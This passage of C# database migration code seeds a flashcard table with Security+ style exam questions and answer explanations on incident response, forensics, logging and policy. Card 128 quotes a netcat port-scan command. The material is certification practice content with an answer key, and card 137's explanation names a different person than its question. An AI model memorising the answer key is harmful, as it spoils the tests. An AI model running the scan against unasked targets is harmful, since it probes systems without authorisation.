                values: new object[] { 732, "\r\n100. B. Building a timeline, particularly from multiple systems,\r\nrelies on accurately set system clocks or adding a manually\r\nconfigured offset. Disk hashing and acquisition does not need an\r\naccurate system clock, and file metadata can be reviewed even\r\nwithout an accurate clock, although accurate clock information\r\nor knowing the offset can be useful for analysis.\r\n", 4, "\r\n100. What key forensic tool relies on correctly set system clocks to work properly?\r\nA. Disk hashing\r\nB. Timelining\r\nC. Forensic disk acquisition\r\nD. File metadata analysis\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 733, "\r\n101. B. Data breach notification laws often build in a maximum\r\nlength of time that can pass before notification is required. They\r\nalso often include a threshold for notification, with a maximum\r\nnumber of exposed individuals before the state or other\r\nauthorities must be notified. They do not include a maximum\r\nnumber of individuals who can be notified, nor do they typically\r\nhave specific requirements about police involvement in forensic\r\ninvestigations or certification types or levels.\r\n", 4, "\r\n101. Valerie is writing her organization’s forensic playbooks and knows that the state that she\r\noperates in has a data breach notification law. Which of the following key items is most\r\nlikely to be influenced by that law?\r\nA. Whether Valerie calls the police for forensic investigation help\r\nB. The maximum amount of time until she has to notify customers of sensitive data\r\nbreaches\r\nC. The certification types and levels that her staff have to maintain\r\nD. The maximum number of residents that she can notify about a breach\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 734, "\r\n102. C. A data loss prevention (DLP) tool that can scan and review\r\nemails for SSN style data is the most effective tool listed here.\r\nNaomi may want to set the tool to block all emails with potential\r\nSSNs, and then review those emails manually to ensure that no\r\nfurther emails leave while allowing legitimate emails to pass\r\nthrough. An intrusion detection system (IDS) might look\r\ntempting as an answer, but an IDS can only detect, not stop, the\r\ntraffic, which would allow the SSNs to exit the organization.\r\nAntimalware and firewalls will not stop this type of event.\r\n", 4, "\r\n102. As part of a breach response, Naomi discovers that Social Security numbers (SSNs) were\r\nsent in a spreadsheet via email by an attacker who gained control of a workstation at her\r\ncompany’s headquarters. Naomi wants to ensure that more SSNs are not sent from her environment.\r\nWhat type of mitigation technique is most likely to prevent this while allowing\r\noperations to continue in as normal a manner as possible?\r\nA. Antimalware installed at the email gateway\r\nB. A firewall that blocks all outbound email\r\nC. A DLP rule blocking SSNs in email\r\nD. An IDS rule blocking SSNs in email\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 764, "\r\n132. A. Playbooks list the actions that an organization will take as\r\npart of a response process. A runbook lists the steps required to\r\nperform an action like notification, removing malware, or\r\nsimilar tasks. Playbooks tend to be used to document processes,\r\nwhereas runbooks tend to be used for specific actions. A disaster\r\nrecovery (DR) plan is used to recover from disasters, and a\r\nbusiness continuity (BC) plan is used to ensure that the\r\norganization continues to function.\r\n", 4, "\r\n132. Ben writes down the checklist of steps that his organization will perform in the event of a\r\ncryptographic malware infection. What type of response document has he created?\r\nA. A playbook\r\nB. A DR plan\r\nC. A BC plan\r\nD. A runbook\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 765, "\r\n133. B. Since MAC addresses are only visible within a broadcast\r\ndomain (local network), the MAC addresses of external hosts\r\ncannot be retrieved using the arp command. The MAC addresses\r\nfor local systems, the IP addresses of the local host, and whether\r\nthey are dynamic or static can all be determined using the arp\r\ncommand.\r\n", 4, "\r\n133. Which of the following is not information that can be gathered from a system by running\r\nthe arp command?\r\nA. The IP address of the local system\r\nB. The MAC addresses of recently resolved external hosts\r\nC. Whether the IP address is dynamic or static\r\nD. The MAC addresses of recently resolved local hosts\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 766, "\r\n134. C. The journalctl tool is used to query the systemd journal. On\r\nsystemd-enabled Linux distributions, the journal contains\r\nkernel and boot messages as well as syslog messages and\r\nmessages from services.\r\n", 4, "\r\n134. What log will journalctl provide Selah access to?\r\nA. The event log\r\nB. The auth log\r\nC. The systemd journal\r\nD. The authentication journal\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 767, "\r\n135. C. The recovery phase often involves adding firewall rules and\r\npatching systems in addition to rebuilding systems. Although\r\npreparation may involve configuring firewall rules or regular\r\npatching, it does not do so in response to an incident.\r\nContainment might involve both but is less likely to, since the\r\nfocus will be on broader fixes, and eradication works to remove\r\nthe threat.\r\n", 4, "\r\n135. What phase of the incident response process often involves adding firewall rules and\r\npatching systems to address the incident?\r\nA. Preparation\r\nB. Eradication\r\nC. Recovery\r\nD. Containment\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 768, "\r\n136. A. The curl command-line tool supports downloads and\r\nuploads from a wide variety of services, and it would be the ideal\r\nsolution for this scenario. hping is used for crafting packets, nmap\r\nis a port scanner, and theHarvester is an open source\r\nintelligence gathering tool, none of which meet Gary’s needs.\r\n", 4, "\r\n136. Gary wants to use a tool that will allow him to download files via HTTP and HTTPS, SFTP,\r\nand TFTP from within the same script. Which command-line tool should he pick from the\r\nfollowing list?\r\nA. curl\r\nB. hping\r\nC. theHarvester\r\nD. nmap\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 769, "\r\n137. C. Gary should look at the trend information for malware\r\ndetections to check to see if there are more infections being\r\ndetected than during recent weeks. This can be a useful\r\nindicator of a change, either due to a new malware technique or\r\npackage, a successful attack that has resulted in staff members\r\nclicking on malicious links or opening malicious emails, or other\r\npaths into the organization. Gary could then check with users\r\nwhose systems reported the malware to see what had occurred.\r\nAlerts might show the infections but would not show the data\r\nover time as easily as trends. Sensors will show individual places\r\ndata is gathered, and bandwidth dashboards can show useful\r\ninformation about which systems are using more or less\r\nbandwidth, but the trends dashboard remains the right place for\r\nhim to look in this situation.\r\n", 4, "\r\n137. Tim wants to check the status of malware infections in his organization using the organization’s\r\nsecurity information and event management (SIEM) device. What SIEM dashboard\r\nwill tell him about whether there are more malware infections in the past few days\r\nthan normal?\r\nA. The alerts dashboard\r\nB. The sensors dashboard\r\nC. The trends dashboard\r\nD. The bandwidth dashboard\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 770, "\r\n138. B. Although it can be easy to focus on the digital part of digital\r\nforensics, interviews with end users and others involved in an\r\nincident can be a key element of a forensic investigation.\r\nInvestigators still need to gather information and record what\r\nthey found, but an interview can provide firsthand knowledge\r\nand additional details that may not be able to be recovered via\r\ntechnical means like email or disk forensics. A chain of custody\r\ndoes not provide information about reports from end users.\r\n", 4, "\r\n138. Warren is gathering information about an incident and wants to follow up on a report from\r\nan end user. What digital forensic technique is often used when end users are a key part of\r\nthe initial incident report?\r\nA. Email forensics\r\nB. Interviews\r\nC. Disk forensics\r\nD. Chain of custody\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 771, "\r\n139. B. The only option on this list that supports Aaron’s\r\nrequirements is NXLog. Syslog can receive Windows events if\r\nthey are converted to syslog, but it isn’t a native feature. IPFIX is\r\na network flow standard, and journalctl is used to access the\r\nsystemd journal.\r\n", 4, "\r\n139. Aaron wants to use a multiplatform logging tool that supports both Windows and Unix/\r\nLinux systems and many log formats. Which of the following tools should he use to ensure\r\nthat his logging environment can accept and process these logs?\r\nA. IPFIX\r\nB. NXLog\r\nC. syslog\r\nD. journalctl\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 772, "\r\n140. A. Typical exercise types for most organizations include\r\nsimulations that emulate an actual incident response process,\r\nwalk-throughs that guide staff through an event, and tabletop\r\nexercises that are gamed out without taking actual action. Drills\r\nare classified as more focused on specific actions or functions,\r\nand they are less common because they can result in inadvertent\r\naction or mistakes and do not cover the breadth of an incident.\r\n", 4, "\r\n140. Which of the following is not a common type of incident response exercise?\r\nA. Drills\r\nB. Simulations\r\nC. Tabletop\r\nD. Walk-throughs\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 773, "\r\n141. A. Of the options listed, netstat is the only tool that will not\r\nperform a port scan.\r\n", 4, "\r\n141. Susan needs to run a port scan of a network. Which of the following tools would not allow\r\nher to perform that type of scan?\r\nA. netstat\r\nB. netcat\r\nC. nmap\r\nD. Nessus\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 774, "\r\n142. C. The top of the diamond should be labeled Adversary, one of\r\nthe four vertices on the Diamond model.\r\n", 4, "\r\n142. What term belongs at point A on the Diamond Model of Intrusion Analysis shown below?\r\nA\r\n4. Netblock ownership\r\npoints to adversary’s\r\nidentity\r\n2. Logs show source\r\nIP of attacker\r\nInfrastucture Capability\r\nVictim\r\n3. SIEM logs show other\r\nactivity by the same\r\nnetblock\r\n1. Victim discovers\r\ncompromised system\r\n5. Adversary identity helps\r\nsecurity staff determine\r\nthreat model and\r\nadditional capabilities\r\nA. Opponent\r\nB. Target\r\nC. Adversary\r\nD. System\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 763, "\r\n131. D. The best option for Alaina would be to use a URL filter to\r\nblock users from visiting the link in the phishing email. A WAF,\r\nor web application firewall, is designed to prevent attacks\r\nagainst a web application. Patching can help stop exploits of\r\nvulnerable services or systems, but this is a phishing attack, and\r\nan allow list lists allowed items, not blocked items, and limiting\r\nwhich websites an entire company can visit is almost impossible\r\nin most circumstances.\r\n", 4, "\r\n131. Alaina’s organization has been suffering from successful phishing attacks, and Alaina notices\r\na new email that has arrived with a link to a phishing site. What response option from the\r\nfollowing will be most likely to stop the phishing attack from succeeding against her users?\r\nA. A WAF\r\nB. A patch\r\nC. An allow list\r\nD. A URL filter\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 775, "\r\n143. C. Electronic discovery, or e-discovery, is the legal proceeding\r\ninvolved in litigation, FoIA requests, and similar efforts that\r\nproduce information in electronic form. Email forensics could\r\nbe required to recover data in an investigation, but there is no\r\nindication in the question of any need for forensic investigation.\r\nInquisitions and provenance are not concepts for the Security+\r\nexam", 4, "\r\n143. The government agency that Vincent works for has received a Freedom of Information Act\r\n(FoIA) request and needs to provide the requested information from its email servers. What\r\nis this process called?\r\nA. Email forensics\r\nB. An inquisition\r\nC. e-discovery\r\nD. Provenance", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 777, "\r\n2. B. If a system is infected with malware, the malware will\r\noperate with the privileges of the current user. If you use\r\nnonadministrative accounts, with least privileges, then the\r\nmalware won’t be able to access administrative functionality\r\nwithout a privilege escalation capability.\r\n", 5, "\r\n2. Adam is concerned about malware infecting machines on his network. One of his concerns\r\nis that malware would be able to access sensitive system functionality that requires\r\nadministrative access. What technique would best address this issue?\r\nA. Implementing host-based antimalware\r\nB. Using a nonadministrative account for normal activities\r\nC. Implementing full-disk encryption (FDE)\r\nD. Making certain the operating systems are patched\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 778, "\r\n3. D. Least privilege is the most fundamental concept in\r\nestablishing accounts. Each user should have just enough\r\nprivileges to do their job. This concept also applies to service\r\naccounts. Although each of the other options is something you\r\nwould consider, they are not as critical as the principle of least\r\nprivilege.\r\n", 5, "\r\n3. You are responsible for setting up new accounts for your company network. What is the\r\nmost important thing to keep in mind when setting up new accounts?\r\nA. Password length\r\nB. Password complexity\r\nC. Account age\r\nD. Least privileges\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 779, "\r\n4. C. Change management is the process of documenting all\r\nchanges made to a company’s network and computers. Avoiding\r\nmaking changes at the same time makes tracking any problems\r\nthat can occur much simpler. Due diligence is the process of\r\ninvestigation and verification of the accuracy of a particular act.\r\nAcceptable use policies state what actions and practices are\r\nallowed in an organization while using technology. Due care is\r\nthe effort made by a reasonable party to avoid harm to another.\r\nIt is the level of judgment, care, determination, and activity a\r\nperson would reasonably expect to do under certain conditions.\r\n", 5, "\r\n4. Which of the following principles stipulates that multiple changes to a computer system\r\nshould not be made at the same time?\r\nA. Due diligence\r\nB. Acceptable use\r\nC. Change management\r\nD. Due care\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 780, "\r\n5. A. An acceptable use policy (AUP) is a document stating what a\r\nuser may or may not have access to on a company’s network or\r\nthe Internet. A clean desk policy ensures that all\r\nsensitive/confidential documents are removed from an end-user\r\nworkstation and locked up when the documents are not in use.\r\nMandatory vacation policy is used by companies to detect fraud\r\nby having a second person, familiar with the duties, help\r\ndiscover any illicit activities. Job rotation is a policy that\r\ndescribes the practice of moving employees between different\r\ntasks. Job rotation can help detect fraud because employees\r\ncannot perform the same actions for long periods of time.\r\n", 5, "\r\n5. You are a security engineer and discovered an employee using the company’s computer systems\r\nto operate their small business. The employee installed their personal software on the\r\ncompany’s computer and is using the computer hardware, such as the USB port. What policy\r\nwould you recommend the company implement to prevent any risk of the company’s data\r\nand network being compromised?\r\nA. Acceptable use policy\r\nB. Clean desk policy\r\nC. Mandatory vacation policy\r\nD. Job rotation policy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 781, "\r\n6. C. The PCI-DSS, or Payment Card Industry Data Security\r\nStandard, is a security standard that is mandated by credit card\r\nvendors. The Payment Card Industry Security Standards Council\r\nis responsible for updates and changes to the standard. GDPR,\r\nor the General Data Protection Regulation, is a standard for data\r\nprivacy and security in the European Union (EU). COPPA is the\r\nChildren’s Online Privacy Protection Act, a U.S. federal law. CIS\r\nis the Center for Internet Security and is not a law or a\r\nregulation.\r\n", 5, "\r\n6. What standard is used for credit card security?\r\nA. GDPR\r\nB. COPPA\r\nC. PCI-DSS\r\nD. CIS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 782, "\r\n7. A. Companies will use mandatory vacation policies to detect\r\nfraud by having a second person, familiar with the duties, help\r\ndiscover any illicit activities. Clean desk policy ensures that all\r\nsensitive/confidential documents are removed from an end-user\r\nworkstation and locked up when the documents are not in use. A\r\nnondisclosure agreement (NDA) protects sensitive and\r\nintellectual data from getting into the wrong hands. Continuing\r\neducation is the process of training adult learners in a broad list\r\nof postsecondary learning activities and programs. Companies\r\nwill use continuing education in training their employees on the\r\nnew threats and also reiterating current policies and their\r\nimportance.\r\n", 5, "\r\n7. You are a security manager for your company and need to reduce the risk of employees\r\nworking in collusion to embezzle funds. Which of the following policies would you\r\nimplement?\r\nA. Mandatory vacations\r\nB. Clean desk\r\nC. NDA\r\nD. Continuing education\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 783, "\r\n8. B. Locking cabinets and drawers is the best solution because\r\nthey allow individuals to lock their drawers and ensure that\r\naccess to a single key does not allow broad access to documents\r\nlike a department door lock or proximity cards for the space.\r\nOnboarding is the process of adding an employee to a company’s\r\nidentity and access management system and would not help\r\nwith securing documents, but it might teach the process of doing\r\nso.\r\n", 5, "\r\n8. After your company implemented a clean desk policy, you have been asked to secure physical\r\ndocuments every night. Which of the following would be the best solution?\r\nA. Department door lock\r\nB. Locking cabinets and drawers at each desk\r\nC. Proximity cards\r\nD. Onboarding\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 784, "\r\n9. D. Quantitative risk assessment is the process of assigning\r\nnumerical values to the probability an event will occur and what\r\nthe impact of the event will have. Change management is the\r\nprocess of managing configuration changes made to a network.\r\nVulnerability assessment attempts to identify, quantify, and\r\nrank the weaknesses in a system. Qualitative risk assessment is\r\nthe process of ranking which risk poses the most danger using\r\nratings like low, medium, and high.\r\n", 5, "\r\n9. Which of the following techniques attempts to predict the likelihood a threat will occur and\r\nassigns monetary values should a loss occur?\r\nA. Change management\r\nB. Vulnerability assessment\r\nC. Qualitative risk assessment\r\nD. Quantitative risk assessment\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 785, "\r\n10. D. A memorandum of understanding (MOU) is a type of\r\nagreement that is usually not legally binding. This agreement is\r\nintended to be mutually beneficial without involving courts or\r\nmoney. An SLA (service level agreement) defines the level of\r\nservice the customer expects from the service provider. The level\r\nof service definitions should be specific and measurable in each\r\narea. A BPA (business partnership agreement) is a legal\r\nagreement between partners. It establishes the terms,\r\nconditions, and expectations of the relationship between the\r\npartners. An ISA (interconnection security agreement) is an\r\nagreement that specifies the technical and security requirements\r\nof the interconnection between organizations.\r\n", 5, "\r\n10. Which of the following agreements is less formal than a traditional contract but still has a\r\ncertain level of importance to all parties involved?\r\nA. SLA\r\nB. BPA\r\nC. ISA\r\nD. MOU\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 786, "\r\n11. A. Escalation is necessary in cases where the current breach\r\ngoes beyond the scope of the organization or investigators or is\r\nrequired by law. In this case, Sally believes a crime has been\r\ncommitted and has escalated the case to law enforcement. Other\r\nescalations might be to federal or state law enforcement, or to\r\nother more capable internal or external investigators.\r\nTokenizing data uses a deidentified replacement data item,\r\npublic notification notifies the population or customers at large,\r\nand outsourcing investigations may be done if specialized skills\r\nare needed.\r\n", 5, "\r\n11. As part of the response to a credit card breach, Sally discovers evidence that individuals in\r\nher organization were actively working to steal credit card information and personally\r\nidentifiable information (PII). She calls the police to engage them for the investigation. What\r\nhas she done?\r\nA. Escalated the investigation\r\nB. Public notification\r\nC. Outsourced the investigation\r\nD. Tokenized the data\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 787, "\r\n12. A. The single loss expectancy (SLE) is the product of the value\r\n($16,000) and the exposure factor (.35), or $5,600.\r\n", 5, "\r\n12. You have an asset that is valued at $16,000, the exposure factor of a risk affecting that asset\r\nis 35 percent, and the annualized rate of occurrence is 75 percent. What is the SLE?\r\nA. $5,600\r\nB. $5,000\r\nC. $4,200\r\nD. $3,000\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 776, "1. A. Caroline should select ISO 27002. ISO 27002 is an\r\ninternational standard for implementing and maintaining\r\ninformation security systems. ISO 27017 is an international\r\nstandard for cloud security; NIST 800-12 is a general security\r\nstandard and it is a U.S. standard, not an international one; and\r\nNIST 800-14 is a standard for policy development, and it is also\r\na U.S. standard, not an international one.\r\n", 5, "1. Caroline has been asked to find an international standard to guide her company’s choices in\r\nimplementing information security management systems. Which of the following would be\r\nthe best choice for her?\r\nA. ISO 27002\r\nB. ISO 27017\r\nC. NIST 800-12\r\nD. NIST 800-14\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 762, "\r\n130. C. Right-to-audit clauses are commonly accepted as part of\r\nservice and leasing contracts regardless of location for\r\ndatacenter co-location and facility rental contracts. Cloud\r\nservice providers, however, are less likely to sign a right-to-audit\r\ncontract. Instead, they may provide third-party audit data to\r\ncustomers or even to potential customers.\r\n", 4, "\r\n130. Which of the following environments is least likely to allow a right-to-audit clause in\r\na contract?\r\nA. A datacenter co-location facility in your state\r\nB. A rented facility for a corporate headquarters\r\nC. A cloud server provider\r\nD. A datacenter co-location facility in the same country but not the same state\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 761, "\r\n129. B. Tony’s best option is likely containment. He may want to\r\nremove that location from the corporate network or to prevent\r\nmost traffic from being permitted until he can take a deeper look\r\ninto what is going on. If he isolated the entire site, he might\r\ndisrupt critical business operations, and segmentation would\r\nhave been more appropriate before the event occurred.\r\n", 4, "\r\n129. Tony works for a large company with multiple sites. He has identified an incident in\r\nprogress at one site that is connected to the organization’s multisite intranet. Which of the\r\nfollowing options is best suited to preserving the organization’s function and protecting it\r\nfrom issues at that location?\r\nA. Isolation\r\nB. Containment\r\nC. Segmentation\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 760, "\r\n128. D. The -v flag for netcat sets it to verbose mode. That means\r\nthat Isaac has attempted to connect to every port from 1 to 1024\r\non 10.11.10.1 using netcat . Since there are no other flags or\r\noptions, it will simply try to connect, and then provide a verbose\r\nresult about what happened, resulting in a simple but effective\r\nport scan.\r\n", 4, "\r\n128. Isaac executes the following command using netcat:\r\nnc -v 10.11.10.1 1-1024\r\nWhat has he done?\r\nA. Opened a web page\r\nB. Connected to a remote shell\r\nC. Opened a local shell listener\r\nD. Performed a port scan\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 735, "\r\n103. C. Email headers contain a significant amount of metadata,\r\nincluding where the email was sent from. The from: field lists a\r\nsender but does not indicate where the email was actually sent\r\nfrom. The to: field lists who the email was sent to, and footers\r\nare not used to store this information for email.\r\n", 4, "\r\n103. Troy wants to review metadata about an email he has received to determine what system or\r\nserver the email was sent from. Where can he find this information?\r\nA. In the email message’s footer\r\nB. In the to: field\r\nC. In the email message’s headers\r\nD. In the from: field\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 736, "\r\n104. A. Jurisdictional boundaries exist between states and localities,\r\nas well as countries, making it challenging for local law\r\nenforcement to execute warrants and acquire data from\r\norganizations outside of their jurisdiction in many cases. Venue\r\nis used to describe where a legal case is conducted. Legislation\r\nmay or may not have an impact, and breach laws are unlikely to\r\nimpact this but would guide Henry about when notifications of a\r\nbreach would need to occur.\r\n", 4, "\r\n104. Henry is working with local police on a forensic case and discovers that he needs data from\r\na service provider in another state. What issue is likely to limit their ability to acquire data\r\nfrom the service provider?\r\nA. Jurisdiction\r\nB. Venue\r\nC. Legislation\r\nD. Breach laws\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 737, "\r\n105. A. Olivia should use John the Ripper. Although both John the\r\nRipper and rainbow table tools like Ophcrack can be used to\r\ncrack passwords, John the Ripper will provide a better view of\r\nhow hard the password was to crack, whereas rainbow table\r\ntools will simply determine if the password hash can be cracked.\r\nCrack.it and TheHunter were made up for this question.\r\n", 4, "\r\n105. Olivia wants to test the strength of passwords on systems in her network. Which of the following\r\ntools is best suited to that task?\r\nA. John the Ripper\r\nB. Rainbow tables\r\nC. Crack.it\r\nD. TheHunter\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 738, "\r\n106. B. The Federal Emergency Management Agency (FEMA), part\r\nof the Department of Homeland Security, is in charge of\r\nContinuity of Operations Planning (COOP), which is a\r\nrequirement for federal agencies. The U.S. Department of\r\nAgriculture (USDA), the National Security Agency (NSA), and\r\nthe Federal Bureau of Investigations (FBI) are not in charge of\r\nContinuity of Operations Planning.\r\n", 4, "\r\n106. What U.S. federal agency is in charge of COOP?\r\nA. The USDA\r\nB. FEMA\r\nC. The NSA\r\nD. The FBI\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 739, "\r\n107. B. Windows configuration data can be queried using\r\nPowerShell, allowing Elaine to write scripts that will gather\r\nsecurity configuration data. Bash is a shell used for Linux\r\nsystems. Although Windows systems can now run Bash in the\r\nLinux subsystem, it isn’t installed by default. Secure Shell (SSH)\r\nis used for remote shell access, and Python could be used but\r\nwould need to be installed specifically for this purpose and isn’t\r\navailable by default.\r\n", 4, "\r\n107. Elaine wants to write a series of scripts to gather security configuration information from\r\nWindows 10 workstations. What tool should she use to perform this task?\r\nA. Bash\r\nB. PowerShell\r\nC. Python\r\nD. SSH\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 740, "\r\n108. C. The best option listed is a Wireshark capture of traffic from\r\nthe phone. In some cases, this traffic may be encrypted, and\r\nRamon may need to take additional steps to decrypt the data.\r\nCall manager logs and Session Initiation Protocol (SIP) logs do\r\nnot include the full audio of a conversation.\r\n", 4, "\r\n108. As part of his incident response, Ramon wants to determine what was said on a Voice\r\nover IP (VoIP) call. Which of the following data sources will provide him with the audio\r\nfrom the call?\r\nA. Call manager logs\r\nB. SIP logs\r\nC. A Wireshark capture of traffic from the phone\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 741, "\r\n109. C. NXLog is a log collection and centralization tool. IPFIX,\r\nNetFlow, and sFlow all gather data about network traffic,\r\nincluding source, destination, port, protocol, and amount of data\r\nsent to be collected.\r\n", 4, "\r\n109. Isabelle wants to gather information about what systems a host is connecting to, how much\r\ntraffic is sent, and similar details. Which of the following options would not allow her to\r\nperform that task?\r\nA. IPFIX\r\nB. NetFlow\r\nC. NXLog\r\nD. sFlow\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 742, "\r\n110. A. Pete has isolated the system by placing it on a separate\r\nlogical network segment without access. Some malware can\r\ndetect if systems lose their network connection, and Pete may\r\nwant to perform forensics via the network or monitor attempts\r\nto send outbound traffic, meaning that simply unplugging the\r\nsystem may not meet his needs. Containment would involve\r\nlimiting the spread or impact of an attack, segmentation places\r\nsystems in groups based on rules or security groupings, and\r\neradication is a part of the incident response (IR) process where\r\ncomponents of an incident or attack are removed.\r\n", 4, "\r\n110. As part of an incident response process, Pete puts a compromised system onto a virtual\r\nLAN (VLAN) that he creates that only houses that system and does not allow it access to\r\nthe Internet. What mitigation technique has he used?\r\nA. Isolation\r\nB. Containment\r\nC. Segmentation\r\nD. Eradication\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 743, "\r\n111. C. Virtual machine forensics typically rely on a snapshot\r\ngathered using the underlying virtualization environment’s\r\nsnapshot capabilities. This will capture both memory state and\r\nthe disk for the system and can be run on an independent\r\nsystem or analyzed using forensic tools.\r\n", 4, "\r\n111. Lucca needs to conduct a forensic examination of a live virtual machine (VM). What\r\nforensic artifact should he acquire?\r\nA. An image of live memory using FTK Imager from the VM\r\nB. A dd image of the virtual machine disk image\r\nC. A snapshot of the VM using the underlying virtualization environment\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 744, "\r\n112. B. The tcpreplay tool is specifically designed to allow PCAP\r\ncapture files to be replayed to a network, allowing exactly this\r\ntype of testing. hping can be used to craft packets, but it’s not\r\ndesigned to replay capture files. tcpdump is used to capture\r\npackets, but again, it not a replay tool, and Cuckoo is a\r\nsandboxing tool for testing and identifying malware packages.\r\n", 4, "\r\n112. James has a PCAP file that he saved while conducting an incident response exercise. He\r\nwants to determine if his intrusion prevention system (IPS) could detect the attack after configuring\r\nnew detection rules. What tool will help him use the PCAP file for his testing?\r\nA. hping\r\nB. tcpreplay\r\nC. tcpdump\r\nD. Cuckoo\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 745, "\r\n113. C. Windows creates a dump file, which contains all the contents\r\nof active memory to allow analysis of the crash.\r\n", 4, "\r\n113. What type of file is created when Windows experiences a blue screen of death?\r\nA. A security log\r\nB. A blue log\r\nC. A dump file\r\nD. A tcpdump\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
